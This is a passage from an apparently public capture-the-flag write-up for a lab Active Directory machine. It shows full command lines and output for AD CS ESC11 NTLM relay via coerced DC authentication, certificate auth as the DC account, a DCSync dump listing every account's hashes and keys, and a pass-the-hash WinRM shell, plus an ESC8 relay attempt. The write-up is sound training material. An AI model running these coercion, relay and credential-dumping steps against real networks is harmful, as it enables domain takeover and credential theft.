2026/09/11 16:48:35 server: Fingerprint ElJRx8xA9lOoD74cU9FfvmtjGWosY2HftKPz2wrqmqY=
2026/09/11 16:48:35 server: Listening on http://0.0.0.0:8000
2026/09/11 16:49:34 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

My `/etc/proxychains.conf` has the following line:

```bash
socks5  127.0.0.1 1080
```

Now I can use `proxychains` to run through the VM.

#### ADCS

I’ll run `certipy` through the tunnel to look for vulnerable certificates:

```console
oxdf@hacky$ proxychains certipy find -u 'nvirelli@ghostlink.htb' -p u47YUclrDiwWxBheaSzI -dc-host dc01.ghostlink.htb -ns 10.129.83.229 -dns-tcp -timeout 10 -vulnerable -stdout
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.83.229:53  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.83.229:636  ...  OK
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.83.229:53  ...  OK
[*] Retrieving CA configuration for 'ghostlink-GPZ-OP26-SECURE-CA' via RRP
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:445  ...  OK
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'ghostlink-GPZ-OP26-SECURE-CA'
[*] Checking web enrollment for CA 'ghostlink-GPZ-OP26-SECURE-CA' @ 'gpz-op26-secure.ghostlink.htb'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:443 <--socket error or timeout!
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : ghostlink-GPZ-OP26-SECURE-CA
    DNS Name                            : gpz-op26-secure.ghostlink.htb
    Certificate Subject                 : CN=ghostlink-GPZ-OP26-SECURE-CA, DC=ghostlink, DC=htb
    Certificate Serial Number           : 3F4302F3D68A6AAE4B792DB93F31CCE5
    Certificate Validity Start          : 2026-03-03 16:52:14+00:00
    Certificate Validity End            : 2126-03-03 17:02:12+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : GHOSTLINK.HTB\Administrators
      Access Rights
        ManageCa                        : GHOSTLINK.HTB\Administrators
                                          GHOSTLINK.HTB\Domain Admins
                                          GHOSTLINK.HTB\Enterprise Admins
        ManageCertificates              : GHOSTLINK.HTB\Administrators
                                          GHOSTLINK.HTB\Domain Admins
                                          GHOSTLINK.HTB\Enterprise Admins
        Enroll                          : GHOSTLINK.HTB\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
      ESC11                             : Encryption is not enforced for ICPR (RPC) requests.
Certificate Templates                   : [!] Could not find any certificate templates
```

No vulnerable certificates, but the CA is vulnerable to ESC8 and ESC11.

The `proxychains` logs are also showing interesting information about the IP of the ADCS server:

```console
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.83.229:53  ...  OK
[*] Retrieving CA configuration for 'ghostlink-GPZ-OP26-SECURE-CA' via RRP
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:445  ...  OK
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'ghostlink-GPZ-OP26-SECURE-CA'
[*] Checking web enrollment for CA 'ghostlink-GPZ-OP26-SECURE-CA' @ 'gpz-op26-secure.ghostlink.htb'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:443 <--socket error or timeout!
```

It does a DNS query to the DC, and then it connects to port 445 (SMB) on 172.16.20.10! That’s the secure site, but it must also be acting as the ADCS server. Later it connects to 80 to check web enrollment, and then tries 443 and fails.

### ADCS Abuse

#### Strategy

ESC8 and ESC11 are very similar. ESC8 is titled NTLM Relay to AD CS Web Enrollment, whereas ESC11 is titled NTLM Relay to AD CS RPC Interface. They are both relay attacks, just over different protocols.

Despite the `certipy` results above, Ghostlink is not actually vulnerable to ESC8. I’ll show what that looks like in Beyond Root.

#### ESC11 Background

The line that matters in the `certipy` output is `Enforce Encryption for Requests: Disabled`. ICPR is the ICertPassage Remote Protocol, the RPC interface used to request certificates from the CA. Allowing unencrypted ICPR requests means I can relay and get a certificate as the DC01$ machine account.

The steps for ESC11 look like:

```
%%{init: {'theme':'dark', 'themeVariables': {'noteTextColor':'#ffffff','noteBkgColor':'#3a3f4b','noteBorderColor':'#8fa0c0'}}}%%
sequenceDiagram
    autonumber
    participant DC as DC01$<br/>10.129.83.229
    participant A as Attacker<br/>10.10.15.169<br/>(coercer + ntlmrelayx)
    participant CA as ADCS CA (ICPR / RPC)<br/>172.16.20.10

    A->>DC: Coerce authentication<br/>(MS-RPRN PrinterBug via coercer)
    DC->>A: NTLM auth as machine account DC01$
    A->>CA: Relay NTLM auth + submit CSR<br/>(encryption not required)
    CA->>A: Issue certificate for DC01$ → DC01.pfx
```

#### ESC11 Execution

I’m going to run `ntlmrelayx` through proxychains with the following options:

- `-t rpc://172.16.20.10` - The target is the ADCS server using RPC.
- `-rpc-mode ICPR` - The mode is ICPR, the thing I’m attacking with ESC11.
- `-icpr-ca-name ghostlink-GPZ-OP26-SECURE-CA` - The CA name to target.
- `-smb2support` - Allow SMB2 support.
- `--template DomainController` - The template to request. The coerced identity is the DC01$ machine account, so it needs a template machines can enroll in, and this is the built-in one for domain controllers.

With that running, I’ll coerce using `coercer`:

```console
oxdf@hacky$ coercer coerce -l 10.10.15.169 -t DC01.ghostlink.htb -d ghostlink.htb -u nvirelli -p u47YUclrDiwWxBheaSzI --dc-ip DC01.ghostlink.htb --always-continue
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target DC01.ghostlink.htb
[*] DCERPC portmapper discovered ports: 49664,49665,49668,49669,49895,49672,49898,49675,49681,52278,49912
[+] DCERPC port '49672' is accessible!
   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
      [!] (NO_AUTH_RECEIVED) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine='\\10.10.15.169\x00')
      [>] (-testing-) MS-RPRN──>RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine='\\10.10.15.169\x00')
```

The first time I attempted this attack, the machine connected to `ntlmrelayx`, but then crashed:

```console
[*] Servers started, waiting for connections
[*] (RPC): Received connection from 10.129.83.229, attacking target rpc://172.16.20.10
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:56466  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:56466  ...  OK
[*] (RPC): Authenticating connection from GHOSTLINK/DC01$@10.129.83.229 against rpc://172.16.20.10 SUCCEED [1]
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Generating CSR...
Exception in thread Thread-12:
Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/threading.py", line 1043, in
_bootstrap_inner
    self.run()
    ~~~~~~~~^^
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/attacks/__
init__.py", line 42, in _wrapped
    return run_func(self, *a, **k)
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/attacks/rp
cattack.py", line 199, in run
    ICPRRPCAttack._run(self)
    ~~~~~~~~~~~~~~~~~~^^^^^^
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/attacks/rp
cattack.py", line 139, in _run
    csr = ADCSAttack.generate_csr(key, self.username, self.config.altName, crypto.FILETYPE_ASN1)
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/attacks/ht
tpattacks/adcsattack.py", line 122, in generate_csr
    req = crypto.X509Req()
          ^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/cryptography/utils.py", line 79, in __g
etattr__
    obj = getattr(self._module, name)
AttributeError: module 'OpenSSL.crypto' has no attribute 'X509Req'
```

The DC is coerced and connects back, and the relay to ICPR happens successfully. It dies trying to generate the CSR. That’s because I’m running `pyOpenSSL` version 26.4.0, and `X509Req` was deprecated in 24.x and removed in 25.0.0.

I can work around this by re-installing Impacket with a lower version of pyOpenSSL with

```bash
uv tool install impacket --force --with 'pyOpenSSL<25'
```

Now I kill `ntlmrelayx`, restart it, and coerce again. There’s a connection at `ntlmrelayx` again:

```console
oxdf@hacky$ proxychains ntlmrelayx.py -t rpc://172.16.20.10 -rpc-mode ICPR -icpr-ca-name ghostlink-GPZ-OP26-SECURE-CA -smb2support --template DomainController
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
...[snip]...
[*] Servers started, waiting for connections
[*] (RPC): Received connection from 10.129.83.229, attacking target rpc://172.16.20.10
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:56466  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.10:56466  ...  OK
[*] (RPC): Authenticating connection from GHOSTLINK/DC01$@10.129.83.229 against rpc://172.16.20.10 SUCCEED [1]
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Generating CSR...
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> CSR generated!
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Getting certificate...
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Successfully requested certificate
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Request ID is 5
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Writing PKCS#12 certificate to ./DC01.pfx
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 [1] -> Certificate successfully written to file
```

It’s written a PFX file for the DC machine account. I’ll make sure that my clock is synced (`sudo ntpdate DC01.ghostlink.htb`), and auth with a new PFX:

```console
oxdf@hacky$ certipy auth -pfx DC01.pfx -dc DC01.ghostlink.htb -ns 10.129.83.229
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'dc01.ghostlink.htb'
[*]     Security Extension SID: 'S-1-5-21-3426459382-1936297842-2312468024-1000'
[*] Using principal: 'dc01$@ghostlink.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@ghostlink.htb': aad3b435b51404eeaad3b435b51404ee:d0132c3d27cc288a81bbee561b387b46
```

This creates a ticket and dumps the hash for the machine account. A domain controller’s own computer account holds the directory replication rights, so DC01$ can ask the domain for every other account’s secrets. I’ll use that to DC sync:

```console
oxdf@hacky$ secretsdump.py 'ghostlink.htb/DC01$@DC01.ghostlink.htb' -hashes :d0132c3d27cc288a81bbee561b387b46
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8190e067f478002ddd63eb209b016696:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d032cdb20005fe4a260fc17b8a9baf68:::
ghostlink.htb\nvirelli:1103:aad3b435b51404eeaad3b435b51404ee:676129a0598fcd8665c6a7caaaa9c439:::
ghostlink.htb\kdraven:1104:aad3b435b51404eeaad3b435b51404ee:6f228ee2322bc5802680157a0bb09290:::
ghostlink.htb\zkovacs:1105:aad3b435b51404eeaad3b435b51404ee:efa7696cf5cf11f9d9eab34a4b71c630:::
ghostlink.htb\ohexley:1106:aad3b435b51404eeaad3b435b51404ee:f9d02e5c934d0f49661e86da2d9bf62b:::
ghostlink.htb\vroth:1107:aad3b435b51404eeaad3b435b51404ee:286496e744bdae43a3d4eb1b78a21f03:::
ghostlink.htb\dsoren:1108:aad3b435b51404eeaad3b435b51404ee:c8bd48ecd2e04f54559a9abfbd5353dd:::
ghostlink.htb\lnoctis:1109:aad3b435b51404eeaad3b435b51404ee:847f06a359aab5d209040bae012abc9e:::
ghostlink.htb\svc_canary:1601:aad3b435b51404eeaad3b435b51404ee:dd59d9a99a629a612d7f03be5473c6fe:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d0132c3d27cc288a81bbee561b387b46:::
GPZ-OP26-SECURE$:1110:aad3b435b51404eeaad3b435b51404ee:8da38bfc7daff276a68d784f3c661f4d:::
[*] Kerberos keys grabbed
Administrator:0x14:3291eeea0dfc6d311e1fc6f5ea0920b0cfee75d818a96b1fd5a70b3b6f28706d
Administrator:0x13:b82fd32fef344067a56681879e2d937e
Administrator:aes256-cts-hmac-sha1-96:b2e73d40a99d49f55a44a05a02fa898119d6f4de72c1eceb5d484c0679d92fd8
Administrator:aes128-cts-hmac-sha1-96:c3607a0efea3207eb5b1df36eb2dd256
Administrator:0x17:8190e067f478002ddd63eb209b016696
krbtgt:aes256-cts-hmac-sha1-96:dd57f2071536498369d05db0dc7f2a3c40a96fb1926bc7623e42bb49a7ba18b6
krbtgt:aes128-cts-hmac-sha1-96:c562f9bfaaae015831f378d2741c1253
krbtgt:0x17:d032cdb20005fe4a260fc17b8a9baf68
ghostlink.htb\nvirelli:0x14:ce92e64c05fe66afb58060e1ef0983217b359a0b3a87d9529f289e180aabc95e
ghostlink.htb\nvirelli:0x13:315eeded98f857deb5f28a2549f99525
ghostlink.htb\nvirelli:aes256-cts-hmac-sha1-96:76782dfccbd36c3e8a4e09af8203c044f562dc5ebddb97831dee997f2b65a32d
ghostlink.htb\nvirelli:aes128-cts-hmac-sha1-96:b2e5069d941a79a7c1d7bc02c18b827d
ghostlink.htb\nvirelli:0x17:676129a0598fcd8665c6a7caaaa9c439
ghostlink.htb\kdraven:0x14:f01540c45d960cc82e0d9569747b94ef0863388499876f10365fdb92d241ca7c
ghostlink.htb\kdraven:0x13:496add226bf54eed2bcff616a3cc7427
ghostlink.htb\kdraven:aes256-cts-hmac-sha1-96:5d1eea87107dd5a11216e6886ebaa79db4e6d7d21cb8a06d113576c2f44585ec
ghostlink.htb\kdraven:aes128-cts-hmac-sha1-96:28a0821637521e40c469bd640923b7f9
ghostlink.htb\kdraven:0x17:6f228ee2322bc5802680157a0bb09290
ghostlink.htb\zkovacs:0x14:0be1642551e814d11aef1f1dc7705b6612af125dd3ae5b17156a256039ba45c8
ghostlink.htb\zkovacs:0x13:fce9c08bf674b2e1259eadd866ef9644
ghostlink.htb\zkovacs:aes256-cts-hmac-sha1-96:99baf1d2a99e3ddf75e484bf9ba58bd1ba2a4a200523f2be4219144e19c3ddee
ghostlink.htb\zkovacs:aes128-cts-hmac-sha1-96:0a4f3727f7c2aee0bd137eaeb7c906e5
ghostlink.htb\zkovacs:0x17:efa7696cf5cf11f9d9eab34a4b71c630
ghostlink.htb\ohexley:0x14:ac21302df648c89b54ddb0ec2f22a8f122c1ff47d0dffcd50529886085b8f90a
ghostlink.htb\ohexley:0x13:c41f89a640da2b1af3e381602f8503dd
ghostlink.htb\ohexley:aes256-cts-hmac-sha1-96:e1f8e6b348ebc518cbf5f02650aaf6634244087305d75f2b544c0a03aa970e12
ghostlink.htb\ohexley:aes128-cts-hmac-sha1-96:d1f62b6d2a626086236b789d75bf65ce
ghostlink.htb\ohexley:0x17:f9d02e5c934d0f49661e86da2d9bf62b
ghostlink.htb\vroth:0x14:6e6030e7e8d50267fab63e69d56131aa3a14ec3d5b54b70752fea8f59a6b60b4
ghostlink.htb\vroth:0x13:25c0bf524a978cd14d3332b1b9a1b059
ghostlink.htb\vroth:aes256-cts-hmac-sha1-96:683e7da8a91c3e5c7e6fd2d7fea769a1afbd0373f5eb2d3408c51748a50b1c92
ghostlink.htb\vroth:aes128-cts-hmac-sha1-96:7f3eeaae4a85680552a70539d110d3ff
ghostlink.htb\vroth:0x17:286496e744bdae43a3d4eb1b78a21f03
ghostlink.htb\dsoren:0x14:b54a5e4256936e93c776f3ba6af89530d2a6fc6af7b2f0211a6debc767b9d335
ghostlink.htb\dsoren:0x13:34791325af749940f85df3543477b69c
ghostlink.htb\dsoren:aes256-cts-hmac-sha1-96:2589bc89635288f2ccaca74cad467faf4ba6709bf465468039c39938af41ade6
ghostlink.htb\dsoren:aes128-cts-hmac-sha1-96:0bbd8373291d40a3ca92a0d99c1fca76
ghostlink.htb\dsoren:0x17:c8bd48ecd2e04f54559a9abfbd5353dd
ghostlink.htb\lnoctis:0x14:492f628c02659f93aeea5a5769167ea5f8147a7e06ed5de111cd6e988110b887
ghostlink.htb\lnoctis:0x13:49d19e328be824903a1bcfd93e5321f3
ghostlink.htb\lnoctis:aes256-cts-hmac-sha1-96:c27a56cfc9ea6d08f66a21607a6f1dbd8f462d9d802a5c6c54a12f53bbbda1d0
ghostlink.htb\lnoctis:aes128-cts-hmac-sha1-96:c4d2d0ef247a066001cc8841829547af
ghostlink.htb\lnoctis:0x17:847f06a359aab5d209040bae012abc9e
ghostlink.htb\svc_canary:0x14:e75bffd54b6aedc6cab7e0a958c25116b37c82761fd0f2a5e31b43d9130abcb4
ghostlink.htb\svc_canary:0x13:5d42be36faf9fd49a111ab545031a982
ghostlink.htb\svc_canary:aes256-cts-hmac-sha1-96:5d9472d1befc55b48e362af2d6c50e11d7f132389b9525b89ad99f794d93615a
ghostlink.htb\svc_canary:aes128-cts-hmac-sha1-96:a3f051c7fe497332edcbdc73978dde0d
ghostlink.htb\svc_canary:0x17:dd59d9a99a629a612d7f03be5473c6fe
DC01$:aes256-cts-hmac-sha1-96:838759dae8edf326847d92a3c754d7e5d93cbfc929c25cd06e67d8bcbfc43b6b
DC01$:aes128-cts-hmac-sha1-96:9a8c33b6ee481f67050157b5dd3f48dd
DC01$:0x17:d0132c3d27cc288a81bbee561b387b46
GPZ-OP26-SECURE$:aes256-cts-hmac-sha1-96:870f4c3c09de06bb174e07d68c577963a0e18f6146b554c75289754c8641c0ab
GPZ-OP26-SECURE$:aes128-cts-hmac-sha1-96:8dd23a4c44b1e7c3c34e6872c1ded417
GPZ-OP26-SECURE$:0x17:8da38bfc7daff276a68d784f3c661f4d
[*] Cleaning up...
```

The first line of output shows a `rpc_s_access_denied` error. This is because `secretsdump` starts by trying to reach the remote registry to pull the local SAM and SECURITY hives, and the machine account isn’t a local administrator on the DC. The domain dump that follows uses DRSUAPI instead, which only needs the replication rights DC01$ already has.

And the resulting Administrator hash to get a shell:

```console
oxdf@hacky$ evil-winrm-py -i DC01.ghostlink.htb -u administrator -H 8190e067f478002ddd63eb209b016696
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.ghostlink.htb:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

And read `root.txt`:

```console
evil-winrm-py PS C:\Users\Administrator\Desktop> type root.txt
a1974f09************************
```

## Beyond Root

### ESC8

#### ESC8 Failures

`certipy` flagged ESC8 as well as ESC11, so it’s worth showing why it doesn’t actually work here. To exploit ESC8, I’ll need access to the web enrollment endpoint. I can reach it with `curl` using `proxychains`:

```console
oxdf@hacky$ proxychains -q curl -I http://gpz-op26-secure.ghostlink.htb/certsrv/
HTTP/1.1 401 Unauthorized
Content-Length: 1293
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
X-Powered-By: ASP.NET
Date: Sat, 12 Sep 2026 02:31:59 GMT
```

It wants NTLM authentication. In general, that’s a good sign, as that’s what certificate enrollment would respond with (but it happens that this is just a default rule running across all the websites on the host).

I’ll start `ntlmrelayx` through proxychains with the following options:

- `-t http://gpz-op26-secure.ghostlink.htb/certsrv/certfnsh.asp` - Targeting the web enrollment URL
- `--adcs` - Try to abuse ADCS
- `--template DomainController` - Target certificate
- `-smb2support` - Allow for SMB2 support.

Now I’ll use `netexec` to trigger PetitPotam:

```console
oxdf@hacky$ netexec smb DC01.ghostlink.htb -u nvirelli -p u47YUclrDiwWxBheaSzI -M coerce_plus -o LISTENER=10.10.15.169 METHOD=Petitpotam
SMB         10.129.83.229   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:ghostlink.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.83.229   445    DC01             [+] ghostlink.htb\nvirelli:u47YUclrDiwWxBheaSzI
COERCE_PLUS 10.129.83.229   445    DC01             VULNERABLE, PetitPotam
```

This generates a bunch of connections, each of which looks like:

```console
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.83.229, attacking target http://gpz-op26-secure.ghostlink.htb
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
[*] HTTP server returned error code 404, treating as a successful login
[*] (SMB): Authenticating connection from GHOSTLINK/DC01$@10.129.83.229 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
[*] (SMB): Received connection from 10.129.83.229, attacking target http://gpz-op26-secure.ghostlink.htb
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80 [*] http://GHOSTLINK/DC01$@gpz-op26-secure.ghost
link.htb [1] -> Using template name: DomainController
[*] http://GHOSTLINK/DC01$@gpz-op26-secure.ghostlink.htb [1] -> Generating CSR...
[*] http://GHOSTLINK/DC01$@gpz-op26-secure.ghostlink.htb [1] -> CSR generated!
[*] http://GHOSTLINK/DC01$@gpz-op26-secure.ghostlink.htb [1] -> Getting certificate...
 ...  OK
[-] http://GHOSTLINK/DC01$@gpz-op26-secure.ghostlink.htb [1] -> Error getting certificate! Make sure you have entered valid certificate
 template.
[*] HTTP server returned error code 404, treating as a successful login
```

It’s showing success up until it tries to get a certificate, and it gets 404!

#### NTLM Auth into 404 Details

I’ll run Wireshark capturing on loopback (which is where I’m sending the requests to be proxied through `proxychains`), and what’s happening is clear. The first request doesn’t have any auth:

```http
GET /certsrv/certfnsh.asp HTTP/1.1
Host: gpz-op26-secure.ghostlink.htb
Accept-Encoding: identity
```

And the server returns 401 asking for it:

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
X-Powered-By: ASP.NET
Date: Sat, 12 Sep 2026 05:42:01 GMT
Content-Length: 1293

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;}
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;}
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>401 - Unauthorized: Access is denied due to invalid credentials.</h2>
  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
 </fieldset></div>
</div>
</body>
</html>
```

Then the client replies with an NTLM auth header:

```http
GET /certsrv/certfnsh.asp HTTP/1.1
Host: gpz-op26-secure.ghostlink.htb
Accept-Encoding: identity
Authorization: NTLM TlRMTVNTUAABAAAAl4II4gAAAAAAAAAAAAAAAAAAAAAKAPRlAAAADw==
```

Understanding the NTLM auth exchange messages is not important to the conclusion at the bottom of this section, but I’ll go into it here because it is interesting. This base64-decodes to:

```console
oxdf@hacky$ echo TlRMTVNTUAABAAAAl4II4gAAAAAAAAAAAAAAAAAAAAAKAPRlAAAADw== | base64 -d | xxd
00000000: 4e54 4c4d 5353 5000 0100 0000 9782 08e2  NTLMSSP.........
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0a00 f465 0000 000f                      ...e....
```

This is the NTLM Type 1 (Negotiate) message. It’s 40 bytes and contains the `NTLMSSP` signature, the message type (`0100 0000` = 1), the negotiate flags the client supports (`9782 08e2`), and a version field (`0a00 f465 0000 000f` = Windows 10.0 build 26100, NTLM revision 15).

The service responds with another 401:

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
WWW-Authenticate: NTLM TlRMTVNTUAACAAAAEgASADgAAAAVgonip7Ypox+ME54AAAAAAAAAAMIAwgBKAAAACgD0ZQAAAA9HAEgATwBTAFQATABJAE4ASwACABIARwBIAE8AUwBUAEwASQBOAEsAAQAeAEcAUABaAC0ATwBQADIANgAtAFMARQBDAFUAUgBFAAQAGgBnAGgAbwBzAHQAbABpAG4AawAuAGgAdABiAAMAOgBnAHAAegAtAG8AcAAyADYALQBzAGUAYwB1AHIAZQAuAGcAaABvAHMAdABsAGkAbgBrAC4AaAB0AGIABQAaAGcAaABvAHMAdABsAGkAbgBrAC4AaAB0AGIABwAIAM+RUm95Qt0BAAAAAA==
Date: Sat, 12 Sep 2026 05:42:01 GMT
Content-Length: 341

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Not Authorized</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Not Authorized</h2>
<hr><p>HTTP Error 401. The requested resource requires user authentication.</p>
</BODY></HTML>
```

That decodes to:

```console
oxdf@hacky$ echo "TlRMTVNTUAACAAAAEgASADgAAAAVgonip7Ypox+ME54AAAAAAAAAAMIAwgBKAAAACgD0ZQAAAA9HAEgATwBTAFQATABJAE4ASwACABIARwBIAE8AUwBUAEwASQBOAEsAAQAeAEcAUABaAC0ATwBQADIANgAtAFMARQBDAFUAUgBFAAQAGgBnAGgAbwBzAHQAbABpAG4AawAuAGgAdABiAAMAOgBnAHAAegAtAG8AcAAyADYALQBzAGUAYwB1AHIAZQAuAGcAaABvAHMAdABsAGkAbgBrAC4AaAB0AGIABQAaAGcAaABvAHMAdABsAGkAbgBrAC4AaAB0AGIABwAIAM+RUm95Qt0BAAAAAA==" | base64 -d | xxd
00000000: 4e54 4c4d 5353 5000 0200 0000 1200 1200  NTLMSSP.........
00000010: 3800 0000 1582 89e2 a7b6 29a3 1f8c 139e  8.........).....
00000020: 0000 0000 0000 0000 c200 c200 4a00 0000  ............J...
00000030: 0a00 f465 0000 000f 4700 4800 4f00 5300  ...e....G.H.O.S.
00000040: 5400 4c00 4900 4e00 4b00 0200 1200 4700  T.L.I.N.K.....G.
00000050: 4800 4f00 5300 5400 4c00 4900 4e00 4b00  H.O.S.T.L.I.N.K.
00000060: 0100 1e00 4700 5000 5a00 2d00 4f00 5000  ....G.P.Z.-.O.P.
00000070: 3200 3600 2d00 5300 4500 4300 5500 5200  2.6.-.S.E.C.U.R.
00000080: 4500 0400 1a00 6700 6800 6f00 7300 7400  E.....g.h.o.s.t.
00000090: 6c00 6900 6e00 6b00 2e00 6800 7400 6200  l.i.n.k...h.t.b.
000000a0: 0300 3a00 6700 7000 7a00 2d00 6f00 7000  ..:.g.p.z.-.o.p.
000000b0: 3200 3600 2d00 7300 6500 6300 7500 7200  2.6.-.s.e.c.u.r.
000000c0: 6500 2e00 6700 6800 6f00 7300 7400 6c00  e...g.h.o.s.t.l.
000000d0: 6900 6e00 6b00 2e00 6800 7400 6200 0500  i.n.k...h.t.b...
